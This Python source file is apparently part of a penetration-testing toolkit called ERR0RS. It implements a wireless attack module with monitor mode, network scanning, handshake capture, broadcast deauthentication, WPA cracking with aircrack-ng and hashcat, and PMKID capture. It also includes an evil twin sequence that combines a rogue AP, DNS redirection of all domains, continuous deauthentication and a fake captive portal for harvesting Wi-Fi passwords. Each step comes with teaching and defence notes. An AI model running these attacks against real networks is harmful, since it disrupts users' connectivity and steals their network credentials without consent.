#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Wireless Attack Module
=========================================
Full wireless penetration testing: monitor mode, handshake capture,
deauth, evil twin, WPA cracking, PMKID attack, hidden SSID discovery.

Integrates: aircrack-ng suite, hostapd, dnsmasq, bettercap.

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import subprocess
import shutil
import os
import sys
import time
from dataclasses import dataclass

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..'))


@dataclass
class WirelessResult:
    technique: str
    command: str
    output: str = ""
    error: str = ""
    success: bool = False
    teach: str = ""
    defend: str = ""


def _run(cmd: str, timeout: int = 30) -> tuple:
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout,
                           encoding='utf-8', errors='replace')
        return p.stdout.strip(), p.stderr.strip(), p.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timeout after {timeout}s", 1
    except Exception as e:
        return "", str(e), 1


def _tool(name: str) -> bool:
    return shutil.which(name) is not None


class WirelessModule:

    # ─────────────────────────────────────────────────
    # MONITOR MODE
    # ─────────────────────────────────────────────────

    def enable_monitor_mode(self, interface: str = "wlan0") -> WirelessResult:
        """Kill interfering processes and enable monitor mode."""
        cmd = (
            f"airmon-ng check kill 2>/dev/null && "
            f"airmon-ng start {interface} 2>/dev/null && "
            f"iwconfig {interface}mon 2>/dev/null || iwconfig wlan0mon 2>/dev/null"
        )
        if not _tool("airmon-ng"):
            cmd = "# Install aircrack-ng: sudo apt install aircrack-ng -y"
        out, err, rc = _run(cmd, timeout=20)
        mon_iface = f"{interface}mon" if "mon" not in interface else interface
        return WirelessResult(
            technique="Wireless — Enable Monitor Mode",
            command=cmd, output=out or f"Monitor mode enabled → {mon_iface}",
            error=err, success=(rc == 0),
            teach=(
                "Monitor mode lets your WiFi card capture ALL wireless frames in range, "
                "not just frames addressed to it. Like a radio scanner vs a walkie-talkie. "
                "airmon-ng check kill stops NetworkManager and wpa_supplicant which "
                "fight monitor mode. Creates a new interface (wlan0mon)."
            ),
            defend=(
                "Monitor mode requires physical proximity. "
                "Enterprise: 802.1X/WPA3-Enterprise makes captured traffic useless. "
                "WIDS (Wireless Intrusion Detection): APs in monitor mode detect nearby "
                "monitoring cards by unique frame patterns."
            )
        )

    def disable_monitor_mode(self, mon_interface: str = "wlan0mon") -> WirelessResult:
        cmd = f"airmon-ng stop {mon_interface} 2>/dev/null && systemctl start NetworkManager 2>/dev/null"
        out, err, rc = _run(cmd, timeout=15)
        return WirelessResult(
            technique="Wireless — Disable Monitor Mode",
            command=cmd, output=out or "Monitor mode disabled.", error=err, success=(rc == 0),
            teach="Always restore managed mode after the assessment — monitor mode disables normal WiFi.",
            defend="N/A — cleanup operation."
        )

    # ─────────────────────────────────────────────────
    # SCANNING
    # ─────────────────────────────────────────────────

    def scan_networks(self, mon_interface: str = "wlan0mon",
                      duration: int = 30) -> WirelessResult:
        """Scan for nearby networks and clients."""
        cmd = f"timeout {duration} airodump-ng {mon_interface} 2>/dev/null"
        out, err, rc = _run(cmd, timeout=duration + 5)
        return WirelessResult(
            technique="Wireless — Network Discovery (airodump-ng)",
            command=cmd, output=out or "[ERR0RS] Run this in a terminal — it streams live output.",
            error=err, success=True,
            teach=(
                "airodump-ng captures beacon frames from all nearby APs. Shows: "
                "BSSID (MAC of AP), ESSID (network name), channel, encryption type, "
                "signal strength (PWR), and connected clients. "
                "Hidden SSIDs show as <length: 0> — deauth a client to reveal the name. "
                "Focus on WPA2 networks with clients for handshake capture."
            ),
            defend=(
                "SSID hiding provides zero real security — airodump reveals it. "
                "Use WPA3 — resistant to offline cracking. "
                "Reduce AP transmit power to limit coverage area. "
                "WIDS detects passive scanning by timing patterns."
            )
        )

    # ─────────────────────────────────────────────────
    # WPA2 HANDSHAKE CAPTURE
    # ─────────────────────────────────────────────────

    def target_capture(self, mon_interface: str, bssid: str,
                       channel: int, output_file: str = "/tmp/errorz_cap") -> WirelessResult:
        """Lock onto a specific AP and capture handshakes."""
        cmd = (
            f"airodump-ng --bssid {bssid} -c {channel} "
            f"-w {output_file} {mon_interface} 2>/dev/null"
        )
        return WirelessResult(
            technique="Wireless — Targeted Capture (airodump-ng)",
            command=cmd, output=f"[ERR0RS] Run in a terminal — captures to {output_file}.cap",
            error="", success=True,
            teach=(
                "Targeting a specific BSSID filters noise and captures only that AP's traffic. "
                "-c locks to the correct channel. -w saves to a .cap file. "
                "Wait for a WPA handshake (client connects) OR use deauth to force one. "
                "The .cap file is what you give to aircrack-ng for cracking."
            ),
            defend=(
                "WPA3 uses SAE (Simultaneous Authentication of Equals) — "
                "offline cracking of captured handshakes is not possible with WPA3. "
                "Enterprise WPA2 (802.1X) uses per-user credentials — capturing "
                "the handshake doesn't give you the password."
            )
        )

    def deauth_attack(self, mon_interface: str, bssid: str,
                      client_mac: str = "FF:FF:FF:FF:FF:FF", count: int = 10) -> WirelessResult:
        """Send deauthentication frames to force a WPA handshake."""
        cmd = f"aireplay-ng --deauth {count} -a {bssid} -c {client_mac} {mon_interface} 2>/dev/null"
        return WirelessResult(
            technique="Wireless — Deauthentication Attack (aireplay-ng)",
            command=cmd,
            output=f"[ERR0RS] Deauth staged — {count} frames → BSSID {bssid}",
            error="", success=True,
            teach=(
                "Deauth frames (802.11 management) are unauthenticated — any device "
                "can send them, and clients MUST obey. Sending deauth to a client "
                "disconnects it. On reconnect, it performs WPA 4-way handshake. "
                "Capture this handshake → crack offline. "
                "client_mac=FF:FF:FF:FF:FF:FF = broadcast deauth (all clients at once)."
            ),
            defend=(
                "802.11w (Management Frame Protection / MFP) authenticates management frames "
                "including deauth — WPA3 mandates this. Upgrade to WPA3. "
                "WIDS detects deauth storms by frame count thresholds."
            )
        )

    # ─────────────────────────────────────────────────
    # WPA CRACKING
    # ─────────────────────────────────────────────────

    def crack_wpa_handshake(self, cap_file: str, wordlist: str,
                             bssid: str = None) -> WirelessResult:
        """Crack WPA handshake with aircrack-ng."""
        bssid_flag = f"-b {bssid}" if bssid else ""
        cmd = f"aircrack-ng {bssid_flag} -w {wordlist} {cap_file} 2>/dev/null"
        out, err, rc = _run(cmd, timeout=300)
        found = "KEY FOUND" in (out or "")
        return WirelessResult(
            technique="Wireless — WPA Handshake Crack (aircrack-ng)",
            command=cmd, output=out or "[ERR0RS] Cap file not found or no handshake in file.",
            error=err, success=found,
            teach=(
                "aircrack-ng tries every word in the wordlist as the WPA PSK. "
                "It's CPU-based — slow. For GPU-accelerated cracking: "
                "convert cap to hccapx: cap2hccapx cap.cap out.hccapx "
                "then: hashcat -m 22000 out.hccapx rockyou.txt "
                "GPU cracking is 100-1000x faster than CPU."
            ),
            defend=(
                "Use a long random WPA2 passphrase (20+ characters). "
                "rockyou.txt has 14M entries — a 20-char random password is not in it. "
                "WPA3 makes offline cracking impossible entirely. "
                "Change WiFi password periodically."
            )
        )

    def pmkid_attack(self, mon_interface: str, bssid: str = None) -> WirelessResult:
        """PMKID attack — get a hash WITHOUT waiting for a client to connect."""
        if not _tool("hcxdumptool") or not _tool("hcxtools"):
            return WirelessResult(
                technique="Wireless — PMKID Attack",
                command="# Install: sudo apt install hcxdumptool hcxtools -y",
                output="[ERR0RS] hcxdumptool not installed.",
                success=False,
                teach=(
                    "PMKID attack (Jens Steube, 2018): extracts a hash from the AP beacon "
                    "WITHOUT any client connecting. PMKID = HMAC-SHA1(PMK, 'PMK Name', AP_MAC, STA_MAC). "
                    "No deauth needed. No clients needed. Just the AP. "
                    "Feed the hash to hashcat: hashcat -m 22000"
                ),
                defend="WPA3. Long random PSK. PMKID is a fundamental WPA2 protocol feature — can't be disabled."
            )
        bssid_flag = f"--filterlist_ap {bssid} --filtermode 2" if bssid else ""
        cmd = (
            f"hcxdumptool -i {mon_interface} {bssid_flag} "
            f"-o /tmp/errorz_pmkid.pcapng --active_beacon --enable_status=15 2>/dev/null"
        )
        return WirelessResult(
            technique="Wireless — PMKID Attack (hcxdumptool)",
            command=cmd,
            output="[ERR0RS] PMKID capture staged. Convert: hcxpcapngtool -o hash.hc22000 /tmp/errorz_pmkid.pcapng",
            error="", success=True,
            teach=(
                "PMKID attack needs zero clients — just the router. "
                "After capture: hcxpcapngtool -o hash.hc22000 /tmp/errorz_pmkid.pcapng "
                "then: hashcat -m 22000 hash.hc22000 rockyou.txt "
                "Game-changing technique — works on most modern WPA2 APs."
            ),
            defend="WPA3 SAE eliminates PMKID vulnerability. Long random PSK limits cracking."
        )

    # ─────────────────────────────────────────────────
    # EVIL TWIN
    # ─────────────────────────────────────────────────

    def evil_twin_commands(self, target_ssid: str, target_channel: int,
                           mon_interface: str = "wlan0mon",
                           ap_interface: str = "wlan1") -> WirelessResult:
        """Generate the command sequence for an evil twin AP."""
        hostapd_conf = f"""/tmp/errorz_evil_twin.conf:
interface={ap_interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={target_channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        dnsmasq_conf = """/tmp/errorz_dnsmasq.conf:
interface=wlan1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/192.168.1.1
"""
        steps = (
            f"# Step 1 — Create configs\n"
            f"# hostapd: {hostapd_conf}\n"
            f"# dnsmasq: {dnsmasq_conf}\n\n"
            f"# Step 2 — Bring up AP interface\n"
            f"ip addr add 192.168.1.1/24 dev {ap_interface}\n"
            f"ip link set {ap_interface} up\n\n"
            f"# Step 3 — Start hostapd (rogue AP)\n"
            f"hostapd /tmp/errorz_evil_twin.conf &\n\n"
            f"# Step 4 — Start DHCP server\n"
            f"dnsmasq -C /tmp/errorz_dnsmasq.conf &\n\n"
            f"# Step 5 — Deauth clients from real AP simultaneously\n"
            f"aireplay-ng --deauth 0 -a <REAL_BSSID> {mon_interface} &\n\n"
            f"# Step 6 — Capture credentials\n"
            f"# Deploy captive portal: python3 -m http.server 80 (serve fake login page)"
        )
        return WirelessResult(
            technique="Wireless — Evil Twin Attack",
            command=steps,
            output="[ERR0RS] Evil Twin command sequence generated. Review before executing.",
            error="", success=True,
            teach=(
                "Evil Twin: create a rogue AP with the same SSID as the target. "
                "Deauth clients from the real AP — they auto-connect to yours (stronger signal). "
                "dnsmasq=DHCP server + DNS. address=/#/192.168.1.1 redirects ALL domains. "
                "Serve a fake captive portal login page to capture WiFi password when "
                "victims 'reconnect'. WiFi Pineapple automates this entire flow."
            ),
            defend=(
                "WPA3 (SAE) — clients can verify AP identity, evil twin fails. "
                "802.11w protects against deauth flooding. "
                "Certificate pinning in enterprise 802.1X prevents credential submission "
                "to rogue APs. User education: don't enter WiFi passwords in popups."
            )
        )

    # ─────────────────────────────────────────────────
    # CONTROLLER
    # ─────────────────────────────────────────────────

    def run(self, action: str, params: dict = None) -> WirelessResult:
        params = params or {}
        a = action.strip().lower()

        iface    = params.get("interface", "wlan0")
        mon      = params.get("mon_interface", "wlan0mon")
        bssid    = params.get("bssid", "")
        channel  = int(params.get("channel", 6))
        client   = params.get("client", "FF:FF:FF:FF:FF:FF")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        cap_file = params.get("cap_file", "/tmp/errorz_cap-01.cap")
        ssid     = params.get("ssid", "TargetNetwork")

        dispatch = {
            "monitor_on":   lambda: self.enable_monitor_mode(iface),
            "monitor_off":  lambda: self.disable_monitor_mode(mon),
            "scan":         lambda: self.scan_networks(mon, int(params.get("duration", 30))),
            "capture":      lambda: self.target_capture(mon, bssid, channel),
            "deauth":       lambda: self.deauth_attack(mon, bssid, client, int(params.get("count", 10))),
            "crack":        lambda: self.crack_wpa_handshake(cap_file, wordlist, bssid or None),
            "pmkid":        lambda: self.pmkid_attack(mon, bssid or None),
            "evil_twin":    lambda: self.evil_twin_commands(ssid, channel, mon),
        }

        if a in dispatch:
            return dispatch[a]()

        return WirelessResult("Unknown", action,
            output=f"[ERR0RS] Unknown wireless action '{a}'. Valid: {', '.join(dispatch.keys())}",
            success=False)


WIRELESS_WIZARD_MENU = {
    "title": "ERR0RS // WIRELESS ATTACK WIZARD",
    "options": [
        {"key": "1", "label": "Enable Monitor Mode",                    "action": "monitor_on"},
        {"key": "2", "label": "Scan Networks (airodump-ng)",            "action": "scan"},
        {"key": "3", "label": "Target & Capture (specific AP)",         "action": "capture"},
        {"key": "4", "label": "Deauth Attack (force handshake)",        "action": "deauth"},
        {"key": "5", "label": "Crack WPA Handshake (aircrack-ng)",      "action": "crack"},
        {"key": "6", "label": "PMKID Attack (no client needed!)",       "action": "pmkid"},
        {"key": "7", "label": "Evil Twin — Rogue AP + Captive Portal",  "action": "evil_twin"},
        {"key": "8", "label": "Disable Monitor Mode (cleanup)",         "action": "monitor_off"},
    ]
}

# Alias — make the class importable as WirelessModule directly
WirelessController = WirelessModule

# ─────────────────────────────────────────────────────────────────────
# MODULE-LEVEL ALIAS — required by errorz_launcher.py availability check
# ─────────────────────────────────────────────────────────────────────
_wireless_controller = WirelessModule()

def run_wireless(action: str, params: dict = None) -> dict:
    """Top-level entry point called by errorz_launcher.py."""
    result = _wireless_controller.run(action, params or {})
    return {
        "status":    "success" if result.success else "error",
        "technique": result.technique,
        "command":   result.command,
        "stdout":    result.output,
        "stderr":    result.error,
        "teach":     result.teach,
        "defend":    result.defend,
    }

if __name__ == "__main__":
    w = WirelessModule()
    print("[ERR0RS] Wireless Module OK")
    r = w.run("monitor_on", {"interface": "wlan0"})
    print(f"Technique : {r.technique}")
    print(f"Command   : {r.command}")
    print(f"\n[TEACH]  {r.teach[:200]}")
